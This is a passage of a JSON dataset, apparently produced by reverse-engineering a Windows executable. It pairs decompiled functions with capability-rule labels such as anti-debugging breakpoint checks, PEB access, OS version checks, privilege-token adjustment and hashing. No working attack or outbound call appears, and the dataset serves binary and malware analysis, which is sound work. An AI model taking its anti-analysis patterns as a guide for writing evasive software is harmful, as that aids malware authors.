            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b6f8(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff6c;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint uStack28;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    puStack68 = 0x48b70e;\n    fcn.004059cc();\n    uStack72 = 0x48b826;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack84 = 0x48b7ff;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    var_5h = true;\n    if (**0x495d18 == 2) {\n        var_5h = 0;\n        puStack92 = &fcn.0048b6f8::TokenHandle;\n        uStack96 = 0x28;\n        uStack100 = 0x48b754;\n        puStack68 = &stack0xfffffffc;\n        uStack100 = sub.kernel32.dll_GetCurrentProcess();\n        puStack104 = 0x48b75a;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            uStack108 = 0x48b7e3;\n            uStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            puStack104 = &stack0xfffffffc;\n            uVar2 = fcn.004059dc(&fcn.0048b6f8::var_1ch);\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0, uVar2);\n            if (iVar1 != 0) {\n                var_20h = 1;\n                if (param_2 == '\\0') {\n                    var_14h = 0;\n                }\n                else if (param_2 == '\\x01') {\n                    var_14h = 2;\n                }\n                var_10h = 0;\n                var_30h = 1;\n                uStack48 = var_1ch;\n                uStack44 = uStack28;\n                uStack40 = var_14h;\n                in_stack_ffffff6c = TokenHandle;\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (TokenHandle, 0, &fcn.0048b6f8::var_20h, 0x10, &fcn.0048b6f8::var_30h, &fcn.0048b6f8::var_10h)\n                ;\n            }\n            *in_FS_OFFSET = in_stack_ffffff6c;\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48b7ea);\n            return;\n        }\n        puStack104 = 0x48b7ef;\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        var_5h = iVar1 == 0;\n        *in_FS_OFFSET = uStack100;\n    }\n    else {\n        *in_FS_OFFSET = uStack88;\n        puStack68 = &stack0xfffffffc;\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x48b82d;\n    uStack84 = 0x48b825;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 894
    },
    "004220a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.004220a0(void)\n\n{\n    uchar *arg_8h;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = 4;\n    arg_8h = auStack8;\n    fcn.0042219c(arg_8h, 4);\n    if (uVar1 != '\\x03') {\n        fcn.004215d8();\n    }\n    return CONCAT44(uVar1, arg_8h);\n}\n",
        "token_count": 106
    },
    "004542a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004542a4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x4542bb;\n    iVar1 = fcn.00454684();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x4542cf;\n    iVar1 = fcn.00404620();\n    puStack32 = 0x4542da;\n    fcn.004541a0();\n    uStack36 = 0x454392;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.00454684();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00454648();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.00454648();\n                fcn.0041975c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x454399;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x45434c;\n        iVar2 = fcn.004198b4();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x45435d;\n            fcn.0044fbb4();\n        }\n        else {\n            uStack36 = 0x454368;\n            fcn.0044fbb4();\n        }\n        uStack36 = 0x454377;\n        fcn.004197a8();\n    }\n    uStack36 = 0x454389;\n    fcn.00404650();\n    uStack36 = 0x454391;\n    fcn.004541a8();\n    return;\n}\n",
        "token_count": 498
    },
    "00468948": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00468948(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    char *pcVar2;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar3;\n    \n    pcVar4 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    pcVar5 = *(in_EAX + 0x34) + param_2;\n    if ((*pcVar5 == *pcVar4) && (pcVar5[1] == pcVar4[1])) {\n        pcVar5 = pcVar5 + 2;\n        pcVar3 = pcVar4 + 2;\n        while (((((pcVar2 = pcVar3 + 1,  *pcVar2 == pcVar5[1] && (pcVar2 = pcVar3 + 2,  *pcVar2 == pcVar5[2])) &&\n                 (pcVar2 = pcVar3 + 3,  *pcVar2 == pcVar5[3])) &&\n                ((pcVar2 = pcVar3 + 4,  *pcVar2 == pcVar5[4] && (pcVar2 = pcVar3 + 5,  *pcVar2 == pcVar5[5])))) &&\n               ((pcVar2 = pcVar3 + 6,  *pcVar2 == pcVar5[6] && (pcVar2 = pcVar3 + 7,  *pcVar2 == pcVar5[7]))))) {\n            pcVar2 = pcVar3 + 8;\n            pcVar5 = pcVar5 + 8;\n            if ((*pcVar2 != *pcVar5) || (pcVar3 = pcVar2,  pcVar4 + 0x102 <= pcVar2)) break;\n        }\n        uVar1 = 0x102 - ((pcVar4 + 0x102) - pcVar2);\n        if (uVar1 < 3) {\n            uVar1 = 2;\n        }\n        else {\n            *(in_EAX + 0x6c) = param_2;\n            if (*(in_EAX + 0x70) < uVar1) {\n                uVar1 = *(in_EAX + 0x70);\n            }\n        }\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 540
    },
    "0048d73c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0048d73c(void)\n\n{\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1(0x400, 0x5a, auStack12, 5);\n    if (iVar1 == 3) {\n        fcn.00405728();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00405268": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00405268(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x492000;\n    do {\n        \"Runtime error     at 00000000\"[uVar2 & 0xff] = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x492004;\n    do {\n        \"Runtime error     at 00000000\"[uVar3 & 0xff] = str.0123456789ABCDEF[uVar2 & 0xf];\n        uVar2 = uVar2 / 0x10;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 221
    },
    "00409d2c": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00409d36: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00409d3b)\n\nvoid __fastcall fcn.00409d2c(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            in_EAX = -in_EAX;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "0040b090": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b090(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x0040b0a6:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x0040b0ad;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x0040b0a6;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x0040b0ad:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x49288c;\n            *puVar3 = param_2 % *0x49288c + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 427
    },
    "0040b4f7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4f7(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40b4e3 + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040b58e;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040b597;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040b59e;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b5c4:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040b59e:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040b58e:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040b597:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040b5c4;\n}\n",
        "token_count": 1161
    },
    "00444960": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444960(void)\n\n{\n    fcn.0040f94c();\n    return;\n}\n",
        "token_count": 25
    },
    "0040a7c4": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a7c4(uint arg_8h, uint arg_ch)\n\n{\n    uint var_12h;\n    int16_t var_eh;\n    int16_t var_ch;\n    uint var_ah;\n    uint16_t var_6h;\n    uint var_4h;\n    \n    fcn.0040bbe8(arg_8h, arg_ch);\n    if ((var_6h < 0x7bc) || (0x83b < var_6h)) {\n        var_4h = 0;\n    }\n    else {\n        fcn.0040b908(&var_12h, arg_8h, arg_ch);\n        var_4h = CONCAT22(var_ah._2_2_ << 5 | var_ah | (var_6h - 0x7bc) * 0x200, \n                          var_12h._2_2_ >> 1 | var_eh << 5 | var_ch << 0xb);\n    }\n    return var_4h;\n}\n",
        "token_count": 239
    },
    "00419db8": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00419db8(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x419e2c != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x00419e24;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x00419e24:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 435
    },
    "0045ec14": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ec14(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    uVar3 = in_EAX[1];\n    uVar4 = in_EAX[2];\n    uVar1 = in_EAX[3];\n    uVar2 = *in_EAX + *param_2 + *0x4937b0 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x4937b4 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar4 = uVar4 + param_2[2] + *0x4937b8 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar5 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x4937bc + ((uVar2 ^ uVar1) & uVar5 ^ uVar2);\n    uVar6 = (uVar3 * 0x400000 | uVar3 >> 10) + uVar5;\n    uVar2 = uVar2 + param_2[4] + *0x4937c0 + ((uVar1 ^ uVar5) & uVar6 ^ uVar1);\n    uVar4 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar6;\n    uVar1 = uVar1 + param_2[5] + *0x4937c4 + ((uVar5 ^ uVar6) & uVar4 ^ uVar5);\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar4;\n    uVar5 = uVar5 + param_2[6] + *0x4937c8 + ((uVar6 ^ uVar4) & uVar3 ^ uVar6);\n    uVar2 = (uVar5 * 0x20000 | uVar5 >> 0xf) + uVar3;\n    uVar6 = uVar6 + param_2[7] + *0x4937cc + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar6 * 0x400000 | uVar6 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x4937d0 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[9] + *0x4937d4 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x4937d8 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xb] + *0x4937dc + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x4937e0 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[0xd] + *0x4937e4 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x4937e8 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xf] + *0x4937ec + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x4937f0 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[6] + *0x4937f4 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + str.QZ._0_4_ + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + *param_2 + *0x4937fc + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x493800 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[10] + *0x493804 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x493808 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[4] + *0x49380c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x493810 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[0xe] + *0x493814 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x493818 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[8] + *0x49381c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x493820 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[2] + *0x493824 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x493828 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[0xc] + *0x49382c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x493830 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[8] + *0x493834 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + *0x493838 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[0xe] + *0x49383c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x493840 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[4] + *0x493844 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x493848 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[10] + *0x49384c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x493850 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + *param_2 + *0x493854 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x493858 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[6] + *0x49385c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x493860 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[0xc] + *0x493864 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x493868 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[2] + *0x49386c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + *param_2 + *0x493870 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[7] + *0x493874 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x493878 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[5] + *0x49387c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x493880 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x493884 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x493888 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x49388c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x493890 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xf] + *0x493894 + ((~uVar2 | uVar4) ^ 